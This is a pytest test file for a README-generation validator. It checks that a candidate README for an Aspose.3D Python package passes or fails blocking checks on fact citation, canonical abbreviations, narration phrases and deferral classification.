"""The twelve blocking checks: a sound candidate passes ten and pends two; each failure names
its causal stage; validation.json is deterministic."""

from __future__ import annotations

import copy
import dataclasses
import hashlib
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from repository_presenter.components.readme.composition.authoring import (
    SectionTask,
    slot_fact_sets,
)
from repository_presenter.components.readme.composition.components.shell import SEMANTIC_SHELL
from repository_presenter.components.readme.composition.link_budget import LinkAllocationPolicy
from repository_presenter.components.readme.composition.policy import PlanningPolicy
from repository_presenter.components.readme.composition.renderer import (
    api_reference_names,
    collapse_document_blank_runs,
    render_readme,
)
from repository_presenter.components.readme.validation.registry import (
    BLOCKING_CHECKS,
    Candidate,
    _check_canonical_name,
    _check_examples,
    _check_install,
    _check_links,
    _check_structure,
    _edition_substitute_failures,
    _fences,
    _renderer_owned,
    blocking_failures,
    canonical_name_pattern,
    protected_fragments,
    summarize_validation,
    validate_candidate,
    write_validation,
)
from repository_presenter.core.facts import Evidence, Fact, FactsDocument
from repository_presenter.core.registry.models import RegistryEntry
from repository_presenter.core.secrets import ConfiguredSecret
from support import REPO_ROOT

ENTRY = RegistryEntry.model_validate(
    {
        "repository": "aspose-3d-foss/Aspose.3D-FOSS-for-Python",
        "family": "3d",
        "platform": "python",
        "ecosystem": "python",
        "mode": "dry_run",
        "policy_profile": "p",
        "active": True,
        "provider_identity": {"provider": "github", "repository_id": 1, "node_id": "R_1"},
    }
)
REVISION = "b" * 40
EXAMPLE = "from aspose.threed import Scene\nScene().save('a.glb')\n"
ORIGINAL = (
    b"# Old\n\nKept verbatim from the old README.\n\n```python\n"
    + EXAMPLE.encode("utf-8")
    + b"```\n\n```bash\npip install aspose-3d-foss\n```\n"
)


def _fact(fact_id: str, kind: str, value: str, *details: str, polarity: str = "SUPPORTED") -> Fact:
    evidence = tuple(Evidence("README.md", detail) for detail in details) or (
        Evidence("README.md"),
    )
    return Fact(fact_id, kind, value, evidence, polarity=polarity)  # type: ignore[arg-type]


BASE_FACTS: tuple[Fact, ...] = (
    _fact("identity:repository", "identity", ENTRY.repository),
    _fact("identity:revision", "identity", REVISION),
    _fact("package:name", "package", "aspose-3d-foss"),
    _fact(
        "install_command:pip",
        "install_command",
        "pip install aspose-3d-foss",
        "distribution name declared by the manifest",
        "package registry: found; latest 26.1.0",
    ),
    _fact("license:spdx", "license", "MIT"),
    _fact("license:file", "license", "LICENSE"),
    _fact(
        "public_symbol:aspose.threed.scene",
        "public_symbol",
        "aspose.threed.Scene",
        "line 1; class; public by name",
    ),
    _fact("format:output.glb", "format", ".glb"),
    _fact("format:input.obj", "format", ".obj"),
    _fact(
        "example:001",
        "example",
        EXAMPLE,
        "lines 5-8; python fence; unit inherited_unit:003.code_block",
        "example 1: EXECUTED; exit 0",
    ),
    _fact(
        "link_target:001",
        "link_target",
        "https://docs.example.com/3d",
        "line 9; external; text 'Docs'",
        "RESOLVED: HTTP 200",
    ),
    _fact("inherited_unit:001.heading", "inherited_unit", "# Old"),
    _fact("inherited_unit:002.paragraph", "inherited_unit", "Kept verbatim from the old README."),
    _fact("inherited_unit:003.code_block", "inherited_unit", "```python\n" + EXAMPLE + "```"),
    _fact(
        "inherited_unit:004.code_block",
        "inherited_unit",
        "```bash\npip install aspose-3d-foss\n```",
    ),
)
FACTS = FactsDocument(ENTRY.repository, REVISION, BASE_FACTS)
TITLES = ["Build scenes", "Save GLB", "Read OBJ", "Inspect nodes", "Convert files", "Export meshes"]
INCLUDED = {
    "identity",
    "badges",
    "opening",
    "navigation",
    "at_a_glance",
    "key_capabilities",
    "installation",
    "quick_start",
    "api_reference",
    "documentation_resources",
    "scope_limitations",
    "license",
}
PLAN: dict[str, Any] = {
    "sections": [
        {"section_id": s, "include": s in INCLUDED, "reason": "r"}
        for s in [
            "identity",
            "badges",
            "opening",
            "navigation",
            "at_a_glance",
            "key_capabilities",
            "installation",
            "dependencies",
            "quick_start",
            "additional_examples",
            "api_reference",
            "documentation_resources",
            "scope_limitations",
            "development_testing",
            "enterprise_relationship",
            "third_party_notices",
            "license",
        ]
    ],
    "core_capabilities": [{"title": t, "fact_ids": ["identity:repository"]} for t in TITLES],
    "at_a_glance": {
        "input_format_ids": ["format:input.obj"],
        "output_format_ids": ["format:output.glb"],
        "capability_titles": TITLES,
    },
    "quick_start_example_id": "example:001",
    "additional_example_ids": [],
    "api_hubs": [
        {"symbol_fact_id": "public_symbol:aspose.threed.scene", "fact_ids": ["example:001"]}
    ],
    "material_limitations": [],
    "links": [{"link_fact_id": "link_target:001", "section_id": "documentation_resources"}],
    "deviations": [],
}


def _unit(section: str, slot: str, text: str) -> dict[str, Any]:
    return {"section": section, "slot": slot, "text": text, "fact_ids": ["identity:repository"]}


UNITS: dict[str, Any] = {
    "units": [
        _unit("opening", "opening", "Aspose.3D FOSS for Python builds scenes with Scene."),
        *(
            _unit("key_capabilities", f"capability:{i}", f"Sentence {i} about the API.")
            for i in range(1, 7)
        ),
        _unit("quick_start", "lead_in", "Create a scene and save it."),
        _unit("api_reference", "intro", "Scene is the entry point."),
        _unit("api_reference", "hub:public_symbol:aspose.threed.scene", "Scene holds the graph."),
        _unit("documentation_resources", "link:link_target:001", "The docs explain the API."),
        _unit("scope_limitations", "scope", "The package writes GLB only."),
    ],
    "omitted": [],
}
DISPOSITIONS: dict[str, Any] = {
    "dispositions": [
        {
            "unit_id": "inherited_unit:001.heading",
            "disposition": "SUPERSEDE_REDUNDANT",
            "destination_section": None,
            "fact_ids": ["identity:repository"],
            "rationale": "r",
        },
        {
            "unit_id": "inherited_unit:002.paragraph",
            "disposition": "VERIFIED_MOVE",
            "destination_section": "scope_limitations",
            "fact_ids": [],
            "rationale": "r",
        },
        {
            "unit_id": "inherited_unit:003.code_block",
            "disposition": "VERIFIED_PRESERVE",
            "destination_section": "quick_start",
            "fact_ids": ["example:001"],
            "rationale": "r",
        },
        {
            "unit_id": "inherited_unit:004.code_block",
            "disposition": "SUPERSEDE_REDUNDANT",
            "destination_section": None,
            "fact_ids": ["install_command:pip"],
            "rationale": "r",
        },
    ]
}
ACCEPTED = frozenset(fact.id for fact in BASE_FACTS)
TASKS = [
    SectionTask("opening", {}, ACCEPTED, ("opening",)),
    SectionTask(
        "key_capabilities",
        {},
        ACCEPTED,
        tuple(f"capability:{i}" for i in range(1, 7)),
        slot_facts=slot_fact_sets("key_capabilities", PLAN),
    ),
    SectionTask("quick_start", {}, ACCEPTED, ("lead_in",)),
    SectionTask("api_reference", {}, ACCEPTED, ("intro", "hub:public_symbol:aspose.threed.scene")),
    SectionTask("documentation_resources", {}, ACCEPTED, ("link:link_target:001",)),
    SectionTask("scope_limitations", {}, ACCEPTED, ("scope",)),
]


def _candidate(
    readme: str | None = None,
    facts: FactsDocument = FACTS,
    dispositions: dict[str, Any] = DISPOSITIONS,
    plan: dict[str, Any] = PLAN,
    units: dict[str, Any] = UNITS,
) -> Candidate:
    rendered = (
        readme if readme is not None else render_readme(ENTRY, facts, plan, units, dispositions)
    )
    return Candidate(
        ENTRY,
        facts,
        plan,
        units,
        dispositions,
        rendered,
        ORIGINAL,
        REVISION,
        hashlib.sha256(ORIGINAL).hexdigest(),
        ("LICENSE", "setup.py"),
        TASKS,
    )


def _verdicts(document: dict[str, Any]) -> dict[str, str]:
    return {check["id"]: check["verdict"] for check in document["checks"]}


def _failed(document: dict[str, Any], check_id: str) -> dict[str, Any]:
    failures = {check["id"]: check for check in blocking_failures(document)}
    assert check_id in failures, _verdicts(document)
    return failures[check_id]


def test_a_sound_candidate_passes_nine_checks_and_pends_the_two_judged_later(
    tmp_path: Path,
) -> None:
    candidate = _candidate()
    assert candidate.readme.count("subgraph cap") == 2  # six capabilities: two columns
    document = validate_candidate(candidate, tmp_path, ())
    assert [check.id for check in BLOCKING_CHECKS] == [c["id"] for c in document["checks"]]
    assert _verdicts(document) == {
        **{f"BC-{i:02d}": "PASS" for i in range(1, 10)},
        "BC-10": "PENDING",
        "BC-11": "PENDING",
        "BC-12": "PASS",
        "BC-14": "PASS",
    }
    assert document["summary"] == {"pass": 11, "fail": 0, "pending": 2}
    assert summarize_validation(document) == "pass 11, fail 0, pending 2"
    assert document["checks"][9]["judged_at"] == "S10"
    assert document["checks"][10]["details"] == ["judged at S12"]
    assert all(check["causal_stage"] is None for check in document["checks"])
    assert document["readme_sha256"] == hashlib.sha256(candidate.readme.encode()).hexdigest()
    assert len(document["protected_content_fingerprint"]) == 64
    assert document["advisory"] == []
    # VALIDATOR_VERSION 8: BC-06 v7 fails the edition substitutes in any letter case and BC-12
    # (canonical product name) is new; VALIDATOR_VERSION 9: BC-07 v9 (verification V2 items 8 and
    # 9); VALIDATOR_VERSION 10: BC-11 v2 is judged from measured evidence (core/noop_proof.py);
    # VALIDATOR_VERSION 11: BC-05 v2 judges each deferral by its cause (validation/deferrals.py);
    # VALIDATOR_VERSION 12: BC-10 v5 accepts a clean single-read ACCEPT with no second-reader
    # trigger (OWNER-15); VALIDATOR_VERSION 13: BC-07 v10 allows zero badges when zero
    # badge-worthy facts exist; VALIDATOR_VERSION 14: advisory_notes records BC-12's own
    # docstring elisions; VALIDATOR_VERSION 15: a refused ACCEPT names the corroborating second
    # read that failed (second_reader.failed); VALIDATOR_VERSION 16: BC-05 v3 (G7-W12) classifies
    # the UNCLASSIFIED deferral family; VALIDATOR_VERSION 17: BC-04 v3 honours the omissions S6
    # recorded (G7-W15); VALIDATOR_VERSION 18: BC-14 v1 (TC-CLM-01) holds version, install-package
    # and publication statements to the facts; VALIDATOR_VERSION 19: BC-05 v4 classifies the typed
    # "not provably carried" deferral ADVISORY (TC-DSP-01 companion). This candidate names no
    # edition, spells its name whole, and passes all of them (it has badge-worthy facts and a
    # rendered badge row, no docstring eliciting an elision, and a clean single-read ACCEPT with no
    # triggered second read, so v13's, v14's, and v15's own allowance/note/detail never fire).
    assert document["source_revision"] == REVISION and document["validator_version"] == "19"


def test_a_blocking_deferral_cause_fails_bc05_and_an_advisory_one_is_only_recorded(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The wiring from a deferral's class to the candidate: BLOCK fails BC-05 at the class's own
    causal stage; ADVISORY leaves BC-05 passing and lands in validation.json's advisory list."""
    from repository_presenter.components.readme.validation import registry
    from repository_presenter.components.readme.validation.deferrals import DeferralFinding

    unit = "inherited_unit:002.paragraph"
    blocking = DeferralFinding(unit, "NOTICES_WITHOUT_RECORD", "BLOCK", "EXTRACTING", "why")
    monkeypatch.setattr(registry, "review_deferrals", lambda *_args: [blocking])
    failed = _failed(validate_candidate(_candidate(), tmp_path, ()), "BC-05")
    assert failed["causal_stage"] == "EXTRACTING"
    assert failed["details"] == [f"{unit} is deferred as NOTICES_WITHOUT_RECORD: why"]

    advisory = DeferralFinding(unit, "SECTION_ABSENT", "ADVISORY", None, "kept off the page")
    monkeypatch.setattr(registry, "review_deferrals", lambda *_args: [advisory])
    document = validate_candidate(_candidate(), tmp_path, ())
    assert _verdicts(document)["BC-05"] == "PASS"
    assert document["advisory"] == [
        f"{unit}: deferred as SECTION_ABSENT (advisory, never published): kept off the page"
    ]

    unclassified = DeferralFinding(unit, "UNCLASSIFIED", "BLOCK", "RECONCILING", "no class")
    monkeypatch.setattr(registry, "review_deferrals", lambda *_args: [unclassified])
    unknown = _failed(validate_candidate(_candidate(), tmp_path, ()), "BC-05")
    assert unknown["causal_stage"] == "RECONCILING"


def test_the_reconcilers_not_carried_deferral_passes_bc05_as_advisory_and_a_look_alike_blocks(
    tmp_path: Path,
) -> None:
    """TC-DSP-01 companion, through the real classification (nothing patched): a unit the
    reconciler deferred because the named section cannot carry it is recorded, not failed; the
    same words without the reconciler's typed prefix are an unclassified cause and block."""
    from repository_presenter.components.readme.reconciliation.dispositions import (
        RECOVERED_COVERAGE_RATIONALE,
    )
    from repository_presenter.components.readme.validation.deferrals import DEFERRAL_CLASSES

    unit = "inherited_unit:002.paragraph"

    def deferred(rationale: str) -> dict[str, Any]:
        entries = [
            {
                **e,
                "disposition": "DEFER_UNRESOLVED",
                "destination_section": None,
                "rationale": rationale,
            }
            if e["unit_id"] == unit
            else e
            for e in DISPOSITIONS["dispositions"]
        ]
        return {"dispositions": entries}

    typed = validate_candidate(
        _candidate(dispositions=deferred(RECOVERED_COVERAGE_RATIONALE + "Placed in scope.")),
        tmp_path,
        (),
    )
    assert _verdicts(typed)["BC-05"] == "PASS"
    assert [note for note in typed["advisory"] if note.startswith(f"{unit}: deferred as ")] == [
        f"{unit}: deferred as NOT_CARRIED_BY_NAMED_SECTION (advisory, never published): "
        + next(c for c in DEFERRAL_CLASSES if c.id == "NOT_CARRIED_BY_NAMED_SECTION").reason
    ]

    look_alike = validate_candidate(
        _candidate(dispositions=deferred("Not carried by the section named; held for the owner.")),
        tmp_path,
        (),
    )
    failed = _failed(look_alike, "BC-05")
    assert failed["causal_stage"] == "RECONCILING"
    assert any(f"{unit} is deferred as UNCLASSIFIED" in detail for detail in failed["details"])


def test_the_coverage_ledger_records_each_row_against_the_evidence(tmp_path: Path) -> None:
    # RESEARCH_AND_GUIDELINES.md section 27.2 RC6: a coverage defect used to dead-end as a
    # presentation advisory because nothing recorded what a row needed against what the evidence
    # gave it. The ledger says it per row, with the reason the evidence itself carries.
    document = validate_candidate(_candidate(), tmp_path, ())
    ledger = {row["section_id"]: row for row in document["coverage"]}
    assert [row["section_id"] for row in document["coverage"]] == [s.id for s in SEMANTIC_SHELL]
    # A structural row rests on no fact kind; navigation renders from the sections present.
    assert ledger["navigation"]["kinds"] == [] and ledger["navigation"]["required"] is True
    # A row names its kinds and how far each resolved. Quick Start is conditional on a verified
    # example since G4-W17 arrival item 54 (README_CONTRACT row 10, eighth revision), so the
    # ledger records it as not required while this plan includes it.
    quick_start = ledger["quick_start"]
    assert quick_start["required"] is False and quick_start["included"] is True
    assert ledger["installation"]["required"] is True
    # A kind that resolved completely is a count and nothing else - no reasons to give.
    assert quick_start["kinds"] == [{"kind": "example", "supported": 1, "extracted": 1}]
    # A row the plan omitted is still recorded, so a gap cannot hide behind an omission.
    assert ledger["third_party_notices"]["included"] is False

    # An example the repository could not run leaves the row short, and the ledger says why in
    # the extractor's own words - the case RC6 measured, where six of twelve never resolved.
    needs_input = Fact(
        "example:002",
        "example",
        "Scene().open('missing.obj')",
        (Evidence("README.md", "example 2: NEEDS_INPUT; FileNotFoundError: no such input"),),
        polarity="UNRESOLVED",
    )
    short = FactsDocument(FACTS.repository, FACTS.source_revision, (*FACTS.facts, needs_input))
    document = validate_candidate(_candidate(facts=short), tmp_path, ())
    rows = {row["section_id"]: row for row in document["coverage"]}
    (examples,) = rows["quick_start"]["kinds"]
    assert examples["supported"] == 1 and examples["extracted"] == 2
    assert examples["reasons"] == [
        "UNRESOLVED: example 2: NEEDS_INPUT; FileNotFoundError: no such input"
    ]


def test_every_failure_record_carries_its_section_and_stage_as_fields(tmp_path: Path) -> None:
    # RESEARCH_AND_GUIDELINES.md section 27.5 D5: a reader of validation.json routes by field.
    # The unit failures are the ones a repair reopens, so each names the section it is about.
    candidate = _candidate()
    broken = {
        "units": [
            {**unit, "fact_ids": [*unit["fact_ids"], "format:nowhere"]}
            if unit["section"] == "opening"
            else unit
            for unit in candidate.units["units"]
        ]
    }
    document = validate_candidate(dataclasses.replace(candidate, units=broken), tmp_path, ())
    units = _failed(document, "BC-04")
    assert units["failures"] == [
        {
            "section_id": "opening",
            "causal_stage": "COMPOSING",
            "detail": "opening/opening cites unknown fact format:nowhere",
        },
        {
            "section_id": "opening",
            "causal_stage": "COMPOSING",
            "detail": "opening: unit opening: cites facts outside this section's set: "
            "format:nowhere",
        },
    ]
    assert units["details"] == [failure["detail"] for failure in units["failures"]]
    # Every check records the list, empty when it passed, so the shape never depends on outcome.
    assert all("failures" in check for check in document["checks"] if check["verdict"] != "PENDING")


def test_bc04_admits_an_identifier_a_units_own_cited_inherited_fact_spells(tmp_path: Path) -> None:
    """G4-W17 arrival item 69: BC-04 must accept exactly what unit_checks (authoring.py) and the
    renderer already do for the same unit - an identifier spelled verbatim inside a SUPPORTED
    inherited_unit fact that unit cites, e.g. a scope_limitations claim naming a member the
    source says is NOT implemented (docs/RESEARCH_LANE_E.md PROPOSAL E9). Scoped to citation: the
    identical text on a unit that does not cite the fact still fails, end to end.
    """
    new_fact_id = "inherited_unit:900.list_item"
    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            _fact(new_fact_id, "inherited_unit", "- `CSSRule.css_text` is not implemented."),
        ),
    )
    # The section's accepted set is the plan's, not derived from `facts` - a fresh fact needs its
    # own task exactly as a real plan would name it among the section's citable facts.
    tasks = [
        SectionTask("scope_limitations", {}, ACCEPTED | {new_fact_id}, ("scope",))
        if task.section_id == "scope_limitations"
        else task
        for task in TASKS
    ]

    def _units(cite: bool) -> dict[str, Any]:
        return {
            "units": [
                {
                    **unit,
                    "text": "The package writes GLB only; CSSRule.css_text is not implemented.",
                    "fact_ids": ([*unit["fact_ids"], new_fact_id] if cite else unit["fact_ids"]),
                }
                if unit["section"] == "scope_limitations" and unit["slot"] == "scope"
                else unit
                for unit in UNITS["units"]
            ],
            "omitted": [],
        }

    def _make(cite: bool) -> Candidate:
        units = _units(cite)
        rendered = render_readme(ENTRY, facts, PLAN, units, DISPOSITIONS)
        return Candidate(
            ENTRY,
            facts,
            PLAN,
            units,
            DISPOSITIONS,
            rendered,
            ORIGINAL,
            REVISION,
            hashlib.sha256(ORIGINAL).hexdigest(),
            ("LICENSE", "setup.py"),
            tasks,
        )

    cited = _make(True)
    assert "`CSSRule.css_text`" in cited.readme  # the renderer wrapped it too (item 69, renderer)
    document = validate_candidate(cited, tmp_path, ())
    assert "BC-04" not in {f["id"] for f in blocking_failures(document)}

    # Mutation: the identical text, on a unit that does not cite the fact, still fails - the
    # admission is scoped to citation, never a blanket allowance for any inherited_unit content
    # (item 44's own docstring already rejected that as licensing an unrelated capability claim).
    uncited = _make(False)
    assert "`CSSRule.css_text`" not in uncited.readme
    document = validate_candidate(uncited, tmp_path, ())
    assert "BC-04" in {f["id"] for f in blocking_failures(document)}


def test_bc04_never_extends_the_cited_inherited_pass_to_key_capabilities(tmp_path: Path) -> None:
    """G4-W17 arrival item 69, narrowed after measurement: Aspose.PDF for .NET's
    key_capabilities capability:3 cited an inherited_unit fact for unrelated evidence and, before
    this gate, gained a free pass to spell every identifier that broad fact mentioned - the
    capability-mis-advertising risk item 44's own docstring names. BC-04's union is
    scope_limitations units only; the identical citing text in key_capabilities still fails."""
    new_fact_id = "inherited_unit:901.list_item"
    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            _fact(new_fact_id, "inherited_unit", "- `CSSRule.css_text` is not implemented."),
        ),
    )
    tasks = [
        SectionTask("key_capabilities", {}, ACCEPTED | {new_fact_id}, task.slots)
        if task.section_id == "key_capabilities"
        else task
        for task in TASKS
    ]
    units = {
        "units": [
            {
                **unit,
                "text": "CSSRule.css_text is not implemented.",
                "fact_ids": [*unit["fact_ids"], new_fact_id],
            }
            if unit["section"] == "key_capabilities" and unit["slot"] == "capability:1"
            else unit
            for unit in UNITS["units"]
        ],
        "omitted": [],
    }
    rendered = render_readme(ENTRY, facts, PLAN, units, DISPOSITIONS)
    candidate = Candidate(
        ENTRY,
        facts,
        PLAN,
        units,
        DISPOSITIONS,
        rendered,
        ORIGINAL,
        REVISION,
        hashlib.sha256(ORIGINAL).hexdigest(),
        ("LICENSE", "setup.py"),
        tasks,
    )
    assert "`CSSRule.css_text`" not in candidate.readme  # the renderer withheld the pass too
    document = validate_candidate(candidate, tmp_path, ())
    assert "BC-04" in {f["id"] for f in blocking_failures(document)}


def test_internal_narration_names_the_llm_owned_section_that_wrote_it(tmp_path: Path) -> None:
    """G4-W17 arrival item 18. `internal narration 'fact id'` carried no `section_id`, so
    `repair/targeted.py::validation_defects` could not route it to any stage and recorded it
    unrepairable both times it was measured (2026-09-06, Aspose.Slides and Aspose.PDF for Java) -
    the same class of failure as any other authored-prose defect, just never localised. Locating
    the phrase in whichever LLM-owned section's own prose contains it lets repair reach it like
    any other."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThis mentions a fact id in prose.\n\n",
    )
    assert narrated != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    structure = _failed(document, "BC-07")
    assert "internal narration 'fact id'" in structure["details"]
    located = next(
        f for f in structure["failures"] if f["detail"] == "internal narration 'fact id'"
    )
    assert located["section_id"] == "scope_limitations"


def test_a_non_canonical_abbreviation_names_the_llm_owned_section_that_wrote_it(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 78 (lane E E4, PDF-Python). The canonical-abbreviation failure carried
    no `section_id` either - the same unrepairable-by-construction gap item 18 already fixed for
    internal narration, one check over: `repair/targeted.py` routes a failure with no `section_id`
    to nothing, and records it unrepairable even though the offending word sits in an ordinary
    authored section a repair could revise. Located the same way narration already is: the first
    LLM-owned section whose own prose contains the word."""
    readme = _candidate().readme
    lowered = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nIt writes pdf files.\n\n",
    )
    assert lowered != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(lowered), tmp_path, ())
    structure = _failed(document, "BC-07")
    detail = "abbreviation 'pdf' is not in its canonical form PDF"
    assert detail in structure["details"]
    located = next(f for f in structure["failures"] if f["detail"] == detail)
    assert located["section_id"] == "scope_limitations"


def test_an_abbreviation_only_a_deterministic_section_spells_names_no_section(
    tmp_path: Path,
) -> None:
    """The other half of item 78: a word only the renderer itself spells (a heading, a table
    cell - never authored prose) is a renderer defect, not a repairable unit, and stays honestly
    unrouted rather than pointed at an LLM-owned section that never wrote it."""
    readme = _candidate().readme
    trailer = readme + "\nSee pdf output above.\n"
    document = validate_candidate(_candidate(trailer), tmp_path, ())
    structure = _failed(document, "BC-07")
    detail = "abbreviation 'pdf' is not in its canonical form PDF"
    assert detail in structure["details"]
    located = next(f for f in structure["failures"] if f["detail"] == detail)
    # Appended past the last real section's own text, so no LLM-owned section's prose has it.
    assert located["section_id"] is None


def test_a_hyphenated_package_name_is_not_flagged_as_a_bare_abbreviation(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 103 (E21). `_LOWER_WORD`'s negative lookbehind excluded a match
    immediately preceded by a dot or word character, but not by a hyphen - the identical shape
    `_COMMAND` was already hardened against for `python-pptx` (item 26), never extended to
    `_LOWER_WORD`. Measured on HTML-Python: `html` inside `aspose-html-foss` (the literal
    `package:name` fact value) matched as a bare abbreviation use it is not."""
    readme = _candidate().readme
    hyphenated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nInstall the aspose-html-foss package from PyPI.\n\n",
    )
    assert hyphenated != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(hyphenated), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}
    # Mutation: the identical word, NOT hyphen-continued, still blocks - never every hyphenated
    # compound is exempted, only a hyphen-continued name.
    bare = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nParses html documents directly.\n\n",
    )
    document = validate_candidate(_candidate(bare), tmp_path, ())
    assert (
        "abbreviation 'html' is not in its canonical form HTML"
        in _failed(document, "BC-07")["details"]
    )


def test_a_word_starting_a_hyphenated_compound_is_not_flagged_as_a_bare_abbreviation(
    tmp_path: Path,
) -> None:
    """G4-W17 arrival item 112 (lane D PROPOSAL P25, PDF-Go). Item 103 gave `_LOWER_WORD` a
    negative lookbehind against a hyphen on its LEFT side only (`aspose-html-foss`); the matching
    negative lookahead on the RIGHT side - the one `composition/renderer.py`'s own `_LOWER_WORD`
    already carries - was never added, so a word that STARTS a hyphenated compound (a module
    path's own trailing segment) still matched as a bare abbreviation use it is not. Measured on
    PDF-Go: 7 of 7 `pdf` matches sat inside hyphenated tokens the renderer pattern already
    excludes."""
    readme = _candidate().readme
    trailing_hyphen = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nBuilt as a thin wrapper around pdf-go bindings.\n\n",
    )
    assert trailing_hyphen != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(trailing_hyphen), tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}
    # Mutation: the identical word, hyphen-continued on NEITHER side, still blocks - never every
    # word beside a hyphen is exempted, only one a hyphen actually continues.
    bare = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nParses pdf documents directly.\n\n",
    )
    document = validate_candidate(_candidate(bare), tmp_path, ())
    assert (
        "abbreviation 'pdf' is not in its canonical form PDF"
        in _failed(document, "BC-07")["details"]
    )


def test_a_planned_capability_title_reaches_the_document_in_canonical_form(tmp_path: Path) -> None:
    """Measured 2026-10-04 on aspose-pdf-foss/Aspose.PDF-FOSS-for-TypeScript: BC-07 failed at
    COMPOSING with ``abbreviation 'pdf' is not in its canonical form PDF`` located in
    key_capabilities, on a planner-authored title the renderer wrote verbatim. End to end: the
    rendered title and the composed document both carry the canonical spelling, so BC-07 passes
    on it. The negative control below (an authored lower-case abbreviation) still blocks."""
    titles = ["Build scenes", "Save GLB", "Read pdf files", "Inspect nodes", "Convert files"]
    plan = {
        **PLAN,
        "core_capabilities": [{"title": t, "fact_ids": ["identity:repository"]} for t in titles],
        "at_a_glance": {**PLAN["at_a_glance"], "capability_titles": titles},
    }
    candidate = _candidate(plan=plan)
    assert "- **Read PDF files.** " in candidate.readme
    document = validate_candidate(candidate, tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}
    # Mutation: the same lower-case word, authored as prose rather than a planned title, still
    # blocks - the canonical form is applied where the renderer writes text, never a free pass.
    authored = candidate.readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nParses pdf documents directly.\n\n",
    )
    document = validate_candidate(_candidate(authored, plan=plan), tmp_path, ())
    assert (
        "abbreviation 'pdf' is not in its canonical form PDF"
        in _failed(document, "BC-07")["details"]
    )


def test_a_verbatim_preserved_unit_keeps_its_source_spelling_of_an_abbreviation(
    tmp_path: Path,
) -> None:
    """README_CONTRACT.md section 7 check 8 (protected content preserved) requires a placed
    inherited unit to render exactly as the upstream wrote it, so the renderer cannot raise an
    abbreviation inside it without breaking that check. Check 7's canonical-abbreviation rule
    therefore does not judge a line that is that verbatim unit's own text (the same exemption
    narration already grants inherited prose). Measured 2026-10-04 on PDF-TypeScript: BC-07
    failed on ``abbreviation 'http'`` located in scope_limitations. The exemption is line-exact:
    the same word on an authored line of the same section still blocks."""
    facts = FactsDocument(
        FACTS.repository,
        FACTS.source_revision,
        (
            *FACTS.facts,
            _fact(
                "inherited_unit:900.paragraph",
                "inherited_unit",
                "Remote resources load over http when the option is enabled.",
            ),
        ),
    )
    dispositions = {
        "dispositions": [
            *DISPOSITIONS["dispositions"],
            {
                "unit_id": "inherited_unit:900.paragraph",
                "disposition": "VERIFIED_MOVE",
                "destination_section": "scope_limitations",
                "fact_ids": [],
                "rationale": "r",
            },
        ]
    }
    candidate = _candidate(facts=facts, dispositions=dispositions)
    assert "Remote resources load over http when the option is enabled." in candidate.readme
    document = validate_candidate(candidate, tmp_path, ())
    assert "BC-07" not in {f["id"] for f in blocking_failures(document)}
    # Negative control: the identical lower-case word, authored in the same section, still blocks.
    authored = candidate.readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nLoads resources over http.\n\n",
    )
    document = validate_candidate(
        _candidate(authored, facts=facts, dispositions=dispositions), tmp_path, ()
    )
    structure = _failed(document, "BC-07")
    detail = "abbreviation 'http' is not in its canonical form HTTP"
    assert detail in structure["details"]
    located = next(f for f in structure["failures"] if f["detail"] == detail)
    assert located["section_id"] == "scope_limitations"


def test_narration_catches_a_claim_about_the_documents_own_verification(tmp_path: Path) -> None:
    """External review, 2026-09-07: measured twice, verbatim, in a sealed candidate's Additional
    Examples lead-in - "More real, verified snippets are collected below" - a claim about the
    document's own verification process that `_NARRATION`'s fixed phrase list did not cover,
    the same category `provider call` and `source revision` already catch."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nMore real, verified snippets follow.\n\n",
    )
    assert narrated != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    structure = _failed(document, "BC-07")
    assert "internal narration 'real, verified'" in structure["details"]


def test_generated_by_this_library_is_a_real_technical_claim_not_narration(
    tmp_path: Path,
) -> None:
    """Third external review, 2026-09-07: measured on a fresh Aspose.Email Python composition.
    A verified inherited fact said "TNEF ... is not parsed or generated." (full stop); authoring's
    own paraphrase appended "by this library" to complete the sentence, accidentally spelling the
    narration phrase "generated by" - a real technical claim about the library's own capability,
    never a claim about who generated the document. The inherited-prose exemption cannot catch
    this: the exact bigram was never in the source text to begin with."""
    readme = _candidate().readme
    narrated = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nTNEF is not parsed or generated by this library.\n\n",
    )
    assert narrated != readme, "the fixture's Scope and Limitations heading was not found"
    document = validate_candidate(_candidate(narrated), tmp_path, ())
    assert "BC-07" not in {c["id"] for c in blocking_failures(document)}
    # A genuine claim about the document's own authorship still blocks.
    real_narration = readme.replace(
        "## Scope and Limitations\n\n",
        "## Scope and Limitations\n\nThis file was generated by repository-presenter.\n\n",
    )
    document = validate_candidate(_candidate(real_narration), tmp_path, ())
    structure = _failed(document, "BC-07")
    assert "internal narration 'generated by'" in structure["details"]


